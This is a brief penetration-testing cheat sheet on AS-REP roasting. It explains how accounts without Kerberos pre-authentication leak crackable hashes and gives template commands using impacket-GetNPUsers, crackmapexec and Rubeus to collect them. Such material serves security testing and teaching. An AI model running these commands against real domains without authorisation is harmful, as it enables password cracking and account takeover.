# AS-REP Roasting
Because UF_DONT_REQUIRE_PREAUTH is set for an account, it doesnt need to pre authenticate itself. Therefore everyone (also an attacker) can request an AS-REP hash for that account, (if it knows its name), and then crack it to obtain the password for that account.

Requirements:
* Userlist without creds OR a user with creds
* UF_DONT_REQUIRE_PREAUTH set

## Remote
A user without creds: get only non pre-auth accounts from file:
`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>` 

A user with creds: get all non pre-auth accounts on domain:
`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request`
`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`

## Local
`Rubeus.exe asreproast`